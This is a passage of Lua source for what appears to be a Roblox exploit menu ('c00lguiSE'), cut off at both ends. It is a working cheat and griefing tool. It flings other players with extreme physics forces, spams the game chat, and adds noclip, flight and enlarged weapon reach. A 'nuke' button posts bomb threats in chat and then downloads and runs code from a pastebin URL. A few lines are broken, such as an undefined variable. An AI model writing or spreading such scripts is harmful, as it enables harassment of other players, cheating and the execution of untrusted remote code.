	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	local AllBool = false
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			AllBool = false
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			AllBool = true
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			AllBool = true
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			AllBool = false
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	function getPlrChar(plr)
		return plr.Character
	end
	
	function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	function getChar()
		local lp = game.Players.LocalPlayer
		return lp and lp.Character or nil
	end
	
	local SkidFling = function(TargetPlayer)
		local Character = Player.Character
		local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
		local RootPart = Humanoid and Humanoid.RootPart
	
		local TCharacter = TargetPlayer.Character
		local THumanoid
		local TRootPart
		local THead
		local Accessory
		local Handle
	
		if TCharacter:FindFirstChildOfClass("Humanoid") then
			THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
		end
		if THumanoid and THumanoid.RootPart then
			TRootPart = THumanoid.RootPart
		end
		if TCharacter:FindFirstChild("Head") then
			THead = TCharacter.Head
		end
		if TCharacter:FindFirstChildOfClass("Accessory") then
			Accessory = TCharacter:FindFirstChildOfClass("Accessory")
		end
		if Accessory and Accessory:FindFirstChild("Handle") then
			Handle = Accessory.Handle
		end
	
		if Character and Humanoid and RootPart then
			if RootPart.Velocity.Magnitude < 50 then
				getgenv().OldPos = RootPart.CFrame
			end
			if THumanoid and THumanoid.Sit and not AllBool then
			end
			if THead then
				workspace.CurrentCamera.CameraSubject = THead
			elseif not THead and Handle then
				workspace.CurrentCamera.CameraSubject = Handle
			elseif THumanoid and TRootPart then
				workspace.CurrentCamera.CameraSubject = THumanoid
			end
			if not TCharacter:FindFirstChildWhichIsA("BasePart") then
				return
			end
	
			local FPos = function(BasePart, Pos, Ang)
				RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang
				Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)
				RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)
				RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
			end
	
			local SFBasePart = function(BasePart)
				local TimeToWait = 2
				local Time = tick()
				local Angle = 0
	
				repeat
					if RootPart and THumanoid then
						if BasePart.Velocity.Magnitude < 50 then
							Angle = Angle + 100
	
							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle),0 ,0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection,CFrame.Angles(math.rad(Angle), 0, 0))
							task.wait()
						else
							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5 ,0), CFrame.Angles(math.rad(-90), 0, 0))
							task.wait()
	
							FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))
							task.wait()
						end
					else
						break
					end
				until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait
			end
	
			workspace.FallenPartsDestroyHeight = 0/0
	
			local BV = Instance.new("BodyVelocity")
			BV.Name = "EpixVel"
			BV.Parent = RootPart
			BV.Velocity = Vector3.new(9e8, 9e8, 9e8)
			BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)
	
			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)
	
			if TRootPart and THead then
				if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then
					SFBasePart(THead)
				else
					SFBasePart(TRootPart)
				end
			elseif TRootPart and not THead then
				SFBasePart(TRootPart)
			elseif not TRootPart and THead then
				SFBasePart(THead)
			elseif not TRootPart and not THead and Accessory and Handle then
				SFBasePart(Handle)
			else
				return 
			end
	
			BV:Destroy()
			Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)
			workspace.CurrentCamera.CameraSubject = Humanoid
	
			repeat
				RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)
				Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))
				Humanoid:ChangeState("GettingUp")
				table.foreach(Character:GetChildren(), function(_, x)
					if x:IsA("BasePart") then
						x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()
					end
				end)
				task.wait()
			until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25
			workspace.FallenPartsDestroyHeight = getgenv().FPDH
		else
			return
		end
	end
	
	
	button.MouseButton1Down:Connect(function()
		local Target = getPlr(input.Text)
		if Target[1] then
			Target = Target[1]
			SkidFling(Target)
		end
	end)
	
end;
task.spawn(C_42);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_44()
local script = G2L["44"];
	local button = script.Parent
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	function getPlrChar(plr)
		return plr.Character
	end
	
	function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	function getChar()
		local lp = game.Players.LocalPlayer
		return lp and lp.Character or nil
	end
	
	local function sendMessage(message)
		local textChannel = game.TextChatService.TextChannels.RBXGeneral
		textChannel:SendAsync(message)
	end
	
	local function triggerNuke(targetPlayer)
		if targetPlayer then
			sendMessage("A BOMB HAS BEEN PLANTED ON "..targetPlayer.DisplayName.." KILLING THEM WILL GET EVERYONE DEAD!")
	
			repeat
				task.wait()
			until targetPlayer.Character and targetPlayer.Character:FindFirstChildOfClass("Humanoid") and targetPlayer.Character:FindFirstChildOfClass("Humanoid").Health < 1
	
			sendMessage(targetPlayer.DisplayName.." IS DEAD!")
			wait(1.5)
			sendMessage("EXPLODING IN 3")
			wait(1.5)
			sendMessage("2")
			wait(1.5)
			sendMessage("1")
			wait(3)
	
			loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))()
		else
			warn("Player not found, did you use their username?")
		end
	end
	
	
	button.MouseButton1Click:Connect(function()
		local Target = getPlr(input.Text)
		if Target[1] then
			Target = Target[1]
			triggerNuke(Target)
		end
	end)
	
end;
task.spawn(C_44);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_46()
local script = G2L["46"];
	local button = script.Parent
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	function getPlrChar(plr)
		return plr.Character
	end
	
	function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	local highlightedPlayers = {}
	
	button.MouseButton1Click:Connect(function()
		local username = input.Text
		local targets = getPlr(username)
		if #targets == 0 then return end
	
		for _, plr in next, targets do
			local char = getPlrChar(plr)
			if char then
				if highlightedPlayers[plr] then
					if char:FindFirstChild("TargetHighlight") then
						char.TargetHighlight:Destroy()
					end
					highlightedPlayers[plr] = nil
					button.Text = "Highlight: OFF"
				else
					local highlight = Instance.new("Highlight")
					highlight.Name = "TargetHighlight"
					highlight.Adornee = char
					highlight.FillColor = Color3.fromRGB(255, 0, 0)
					highlight.OutlineColor = Color3.fromRGB(255, 216, 217)
					highlight.Parent = char
					highlightedPlayers[plr] = highlight
					button.Text = "Highlight: ON"
				end
			end
		end
	end)
	
end;
task.spawn(C_46);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_48()
local script = G2L["48"];
	local button = script.Parent
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Camera = workspace.CurrentCamera
	
	local spectating = false
	local spectateTarget = nil
	
	function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, game.Players.LocalPlayer)
		elseif name == "others" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr ~= game.Players.LocalPlayer then
					table.insert(results, plr)
				end
			end
		elseif name == "all" then
			for _, plr in ipairs(game.Players:GetPlayers()) do
				table.insert(results, plr)
			end
		else
			for _, plr in ipairs(game.Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	function getPlrChar(plr)
		return plr.Character
	end
	
	function getRoot(char)
		return char:FindFirstChild("HumanoidRootPart")
	end
	
	function getChar()
		local lp = game.Players.LocalPlayer
		return lp and lp.Character or nil
	end
	
	local function startSpectate(target)
		spectating = true
		spectateTarget = target
		button.Text = "Spectate Player: On"
	
		Camera.CameraSubject = target.Character and target.Character:FindFirstChild("Humanoid")
	end
	
	local function stopSpectate()
		spectating = false
		spectateTarget = nil
		button.Text = "Spectate Player: Off"
	
		Camera.CameraSubject = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid")
	end
	
	
	button.MouseButton1Click:Connect(function()
		local typed = input.Text or ""
		if typed == "" then
			stopSpectate()
			return
		end
	
		local matches = getPlr(typed)
		if #matches == 0 then return end
	
		local target = matches[1]
	
		if spectating and spectateTarget == target then
			stopSpectate()
		else
			startSpectate(target)
		end
	end)
	
end;
task.spawn(C_48);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_4a()
local script = G2L["4a"];
	local button = script.Parent
	
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	local input = button.Parent.Parent.PlayerControl.PlayerInput
	
	
	local function getChar(player)
		return player and player.Character
	end
	
	local function getRoot(character)
		return character and character:FindFirstChild("HumanoidRootPart")
	end
	
	local function getPlrHum(player)
		local char = getChar(player)
		return char and char:FindFirstChildOfClass("Humanoid")
	end
	
	
	local function getPlr(name)
		local results = {}
		name = name:lower()
	
		if name == "me" then
			table.insert(results, LocalPlayer)
	
		elseif name == "others" then
			for _, plr in ipairs(Players:GetPlayers()) do
				if plr ~= LocalPlayer then
					table.insert(results, plr)
				end
			end
	
		elseif name == "all" then
			for _, plr in ipairs(Players:GetPlayers()) do
				table.insert(results, plr)
			end
	
		else
			for _, plr in ipairs(Players:GetPlayers()) do
				if plr.Name:lower():sub(1, #name) == name then
					table.insert(results, plr)
				end
			end
		end
	
		return results
	end
	
	
	local function click()
		local username = input.Text
		if not username or username == "" then return end
	
		local targets = getPlr(username)
	
		local char = getChar(LocalPlayer)
		local root = getRoot(char)
		if not root then return end
	
		local oldCF = root.CFrame
		local distancepl = 2
	
		for _, plr in ipairs(targets) do
			if getPlrHum(plr) then
				local targetRoot = getRoot(plr.Character)
				if targetRoot then
					root.CFrame = targetRoot.CFrame + targetRoot.CFrame.LookVector * distancepl
					root.CFrame = CFrame.new(root.Position, targetRoot.Position)
					task.wait(0.5)
					root.CFrame = oldCF
				end
			end
		end
	end
	
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_4a);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerCommands.Button.ButtonScript
local function C_4c()
local script = G2L["4c"];
	local button = script.Parent
	
	
	function click()
		
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_4c);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.SelectButton.LocalScript
local function C_50()
local script = G2L["50"];
	local button = script.Parent
	local menu = button.Parent.PlayerSelect
	
	button.MouseButton1Click:Connect(function()
		menu.Visible = not menu.Visible
	end)
	
end;
task.spawn(C_50);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.LocalScript
local function C_53()
local script = G2L["53"];
	local Players = game:GetService("Players")
	
	local scrollingFrame = script.Parent
	local template = scrollingFrame:WaitForChild("Template")
	local layout = scrollingFrame:WaitForChild("UIListLayout")
	
	template.Visible = false
	
	local buttons = {}
	
	local specialList = {"me", "others", "all"}
	
	
	local function updateCanvas()
		scrollingFrame.CanvasSize = UDim2.fromOffset(
			0,
			layout.AbsoluteContentSize.Y
		)
	end
	
	
	local function setHeadshot(button, userId)
		local icon = button:FindFirstChild("Icon")
		if icon then
			local thumb, isReady = Players:GetUserThumbnailAsync(
				userId,
				Enum.ThumbnailType.HeadShot,
				Enum.ThumbnailSize.Size48x48
			)
			icon.Image = thumb
		end
	end
	
	
	local function addSpecial(name)
		if buttons[name] then return end
	
		local button = template:Clone()
		button.Name = name
		button.Text = name
		button.Visible = true
		button.Parent = scrollingFrame
	
		local icon = button:FindFirstChild("Icon")
		if icon then
			if name == "me" then
				setHeadshot(button, Players.LocalPlayer.UserId)
			else
				icon.Image = ""
			end
		end
	
		buttons[name] = button
		updateCanvas()
	end
	
	
	local function addPlayer(player)
		if buttons[player.Name] then return end
	
		local button = template:Clone()
		button.Name = player.Name
		button.Text = player.Name
		button.Visible = true
		button.Parent = scrollingFrame
	
		setHeadshot(button, player.UserId)
	
		for _, obj in ipairs(button:GetDescendants()) do
			if obj:IsA("LocalScript") then
				obj.Enabled = false
				obj.Enabled = true
			end
		end
	
		buttons[player.Name] = button
		updateCanvas()
	end
	
	
	local function removePlayer(player)
		local button = buttons[player.Name]
		if button then
			button:Destroy()
			buttons[player.Name] = nil
			updateCanvas()
		end
	end
	
	
	for _, name in ipairs(specialList) do
		addSpecial(name)
	end
	
	
	for _, player in ipairs(Players:GetPlayers()) do
		addPlayer(player)
	end
	
	
	Players.PlayerAdded:Connect(addPlayer)
	Players.PlayerRemoving:Connect(removePlayer)
	
	layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateCanvas)
end;
task.spawn(C_53);
-- StarterGui.c00lguiSE.Main.Pages.Players.PlayerControl.PlayerSelect.Template.LocalScript
local function C_55()
local script = G2L["55"];
	local button = script.Parent
	local menu = button.Parent
	local input = button.Parent.Parent.PlayerInput
	
	button.MouseButton1Click:connect(function()
		input.Text = button.Name
		button.Parent.Visible = false
	end)
end;
task.spawn(C_55);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_59()
local script = G2L["59"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.WalkSpeedInput
	
	
	function click()
		if input.Text == "" then input.Text = "50" end
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = input.Text
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_59);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_5c()
local script = G2L["5c"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.JumpPowerInput
	
	
	function click()
		if input.Text == "" then input.Text = "150" end
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = input.Text
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_5c);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_5e()
local script = G2L["5e"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.GravityInput
	
	
	function click()
		if input.Text == "" then input.Text = "30" end
		game.Workspace.Gravity = input.Text
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_5e);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_60()
local script = G2L["60"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local a = Instance.new("Animation")
		a.AnimationId = "rbxassetid://243999792"
		local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(a)
		k:Play()
		k:AdjustSpeed(2)
		wait(0.5)
		k:AdjustSpeed(0)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_60);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_62()
local script = G2L["62"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
		local platform = Instance.new("Part")
		platform.Size = Vector3.new(16, 1, 16)
		platform.Transparency = 0.5
		platform.Color = Color3.fromRGB(255, 0, 255)
		platform.Anchored = true
		platform.Parent = workspace
		local player_position = game.Players.LocalPlayer.Character.Head.Position
		platform.Position = Vector3.new(player_position.X, player_position.Y-5, player_position.Z)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_62);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_64()
local script = G2L["64"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	
	
	
	function click()
	
		_G.infinjump = not _G.infinjump
		
		if _G.infinjump == true then
			button.Text = "Infinite Jump: ON"
		else
			button.Text = "Infinite Jump: OFF"
		end
	
		if _G.infinJumpStarted == nil then
			_G.infinJumpStarted = true
	
			local plr = game:GetService('Players').LocalPlayer
	
			function doJump()
				if _G.infinjump then
					humanoid = game:GetService'Players'.LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
					humanoid:ChangeState('Jumping')
					wait()
					humanoid:ChangeState('Seated')
				end
			end
	
			--PC Support
			local m = plr:GetMouse()
			m.KeyDown:connect(function(k)
				if k:byte() == 32 then
					doJump()
				end
			end)
	
			--Mobile support
			local uis = game:GetService("UserInputService")
			task.spawn(function()
				local pg = plr:WaitForChild("PlayerGui")
				local btn = pg:WaitForChild("TouchGui"):WaitForChild("TouchControlFrame"):WaitForChild("JumpButton", 3)
				if btn then
					btn.MouseButton1Down:Connect(doJump)
				else
					uis.JumpRequest:Connect(doJump)
				end
			end)
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_64);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_66()
local script = G2L["66"];
	local button = script.Parent
	local RunService = game:GetService("RunService")
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local noclipConnection
	
	
	
	function click()
		if button.Text == "Noclip: OFF" then
			for _, v in pairs(character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = false
				end
			end
			button.Text = "Noclip: ON"
		else
			for _, v in pairs(character:GetDescendants()) do
				if v:IsA("BasePart") then
					v.CanCollide = true
				end
			end
			button.Text = "Noclip: OFF"
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_66);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_68()
local script = G2L["68"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.ChatSpamInput
	local input2 = button.Parent.Parent.Settings.SpamWaitInput
	local TextChatService = game:GetService("TextChatService")
	
	local running = false
	local loopThread
	
	
	function click()
		if input.Text == "" then input.Text = "join team c00lkidd!" end
		if input2.Text == "" then input2.Text = "0.5" end
		running = not running
	
		if running then
			button.Text = "Chat Spam: ON"
			loopThread = task.spawn(function()
				while running do
					if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
						local textChannel = TextChatService.TextChannels.RBXGeneral
						textChannel:SendAsync(input.Text)
					else
						game:GetService("ReplicatedStorage")
							.DefaultChatSystemChatEvents
							.SayMessageRequest:FireServer(input.Text, "All")
					end
					wait(tonumber(input2.Text) or 1)
				end
			end)
		else
			button.Text = "Chat Spam: OFF"
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_68);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_6a()
local script = G2L["6a"];
	local button = script.Parent
	
	
	function click()
		local player = game.Players.LocalPlayer
		player.Character.Humanoid.Health = 0
		player.LoadCharacterAsync()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_6a);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_6c()
local script = G2L["6c"];
	local button = script.Parent
	
	
	function click()
		local player = game.Players.LocalPlayer
		game.Workspace.CurrentCamera:remove()
		wait(.1)
		game.Workspace.CurrentCamera.CameraSubject = player.Character.Humanoid or game.Workspace[player.Name].Humanoid
		game.Workspace.CurrentCamera.CameraType = "Custom"
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_6c);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_6e()
local script = G2L["6e"];
	local button = script.Parent
	local input = button.Parent.Parent.Settings.FlySpeedInput
	
	local Players = game:GetService("Players")
	local UIS = game:GetService("UserInputService")
	local RunService = game:GetService("RunService")
	
	local player = Players.LocalPlayer
	
	local FLYING = false
	
	local flyConn
	local keyDown, keyUp
	
	local CONTROL = {F=0,B=0,L=0,R=0,U=0,D=0}
	
	
	
	local function startFly()
		local char = player.Character or player.CharacterAdded:Wait()
		local hum = char:WaitForChild("Humanoid")
		local root = char:WaitForChild("HumanoidRootPart")
	
		local BV = Instance.new("BodyVelocity")
		local BG = Instance.new("BodyGyro")
	
		BV.MaxForce = Vector3.new(9e9,9e9,9e9)
		BG.MaxTorque = Vector3.new(9e9,9e9,9e9)
	
		BV.Parent = root
		BG.Parent = root
	
		hum.PlatformStand = true
	
		keyDown = UIS.InputBegan:Connect(function(input, gp)
			if gp then return end
	
			if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 1 end
			if input.KeyCode == Enum.KeyCode.S then CONTROL.B = -1 end
			if input.KeyCode == Enum.KeyCode.A then CONTROL.L = -1 end
			if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 1 end
			if input.KeyCode == Enum.KeyCode.E then CONTROL.U = 1 end
			if input.KeyCode == Enum.KeyCode.Q then CONTROL.D = -1 end
		end)
	
		keyUp = UIS.InputEnded:Connect(function(input)
			if input.KeyCode == Enum.KeyCode.W then CONTROL.F = 0 end
			if input.KeyCode == Enum.KeyCode.S then CONTROL.B = 0 end
			if input.KeyCode == Enum.KeyCode.A then CONTROL.L = 0 end
			if input.KeyCode == Enum.KeyCode.D then CONTROL.R = 0 end
			if input.KeyCode == Enum.KeyCode.E then CONTROL.U = 0 end
			if input.KeyCode == Enum.KeyCode.Q then CONTROL.D = 0 end
		end)
	
		flyConn = RunService.RenderStepped:Connect(function()
			if not FLYING then return end
	
			local cam = workspace.CurrentCamera
	
			local forward = cam.CFrame.LookVector
			local right = cam.CFrame.RightVector
			local up = Vector3.new(0,1,0)
	
			local move =
				forward * (CONTROL.F + CONTROL.B) +
				right * (CONTROL.R + CONTROL.L) +
				up * (CONTROL.U + CONTROL.D)
	
			if move.Magnitude > 0 then
				move = move.Unit
			end
	
			BV.Velocity = move * input.Text
			BG.CFrame = cam.CFrame
		end)
	end
	
	local function stopFly()
		FLYING = false
	
		if keyDown then keyDown:Disconnect() end
		if keyUp then keyUp:Disconnect() end
		if flyConn then flyConn:Disconnect() end
	
		local char = player.Character
		if char then
			local root = char:WaitForChild("HumanoidRootPart")
			root:FindFirstChildOfClass("BodyVelocity"):Destroy()
			root:FindFirstChildOfClass("BodyGyro"):Destroy()
			
			local hum = char:FindFirstChildOfClass("Humanoid")
			if hum then hum.PlatformStand = false end
		end
	end
	
	-- fixed toggle
	button.MouseButton1Click:Connect(function()
		if input.Text == "" then input.Text = "60" end
		if FLYING then
			stopFly()
			button.Text = "Fly: OFF"
		else
			startFly()
			FLYING = true
			button.Text = "Fly: ON"
		end
	end)
	
end;
task.spawn(C_6e);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_70()
local script = G2L["70"];
	local button = script.Parent
	
	
	function click()
		game:GetService("Players").LocalPlayer.Character.Head:FindFirstChildOfClass("SpecialMesh"):Destroy()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_70);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_72()
local script = G2L["72"];
	local button = script.Parent
	local input = button.Parent.Parent.Settings.ToolHitboxInput
	
	function click()
		if input.Text == "" then input.Text = "100" end
		local reachsize = input.Text
		local Tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") or game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool")
		if Tool:FindFirstChild("OGSize3") then
			Tool.Handle.Size = Tool.OGSize3.Value
			Tool.OGSize3:Destroy()
			Tool.Handle.FunTIMES:Destroy()
		end
		local val = Instance.new("Vector3Value",Tool)
		val.Name = "OGSize3"
		val.Value = Tool.Handle.Size
		local sb = Instance.new("SelectionBox")
		sb.Adornee = Tool.Handle
		sb.Name = "FunTIMES"
		sb.Parent = Tool.Handle
		Tool.Handle.Massless = true
		Tool.Handle.Size = Vector3.new(Tool.Handle.Size.X,Tool.Handle.Size.Y,reachsize)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_72);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_74()
local script = G2L["74"];
	local button = script.Parent
	local input = button.Parent.Parent.Settings.AnimationIDInput
	local input = button.Parent.Parent.Settings.AnimationSpeedInput
	
	function click()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://" .. input.Text
		local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(input2.Text)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_74);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_76()
local script = G2L["76"];
	local button = script.Parent
	
	local AntiFling = false
	local connections = {}
	
	function click()
		AntiFling = not AntiFling
	
		if not AntiFling then
			-- turn OFF, disconnect everything
			for _, c in pairs(connections) do
				c:Disconnect()
			end
			connections = {}
			button.Text = "Anti-Fling: OFF"
			return
		end
	
		button.Text = "Anti-Fling: ON"
	
		local function NoCollision(PLR)
			if AntiFling and PLR.Character then
				for _, x in pairs(PLR.Character:GetDescendants()) do
					if x:IsA("BasePart") and x.CanCollide then
						x.CanCollide = false
					end
				end
			end
		end
	
		for _, v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer then
				local antifling = game:GetService("RunService").Stepped:Connect(function()
					NoCollision(v)
				end)
				table.insert(connections, antifling)
			end
		end
	
		local added = game.Players.PlayerAdded:Connect(function(v)
			if v ~= game.Players.LocalPlayer then
				local antifling = game:GetService("RunService").Stepped:Connect(function()
					NoCollision(v)
				end)
				table.insert(connections, antifling)
			end
		end)
	
		table.insert(connections, added)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_76);
-- StarterGui.c00lguiSE.Main.Pages.LocalPlayer.Button.ButtonScript
local function C_78()
local script = G2L["78"];
	local button = script.Parent
	local LocalPlayer = game.Players.LocalPlayer
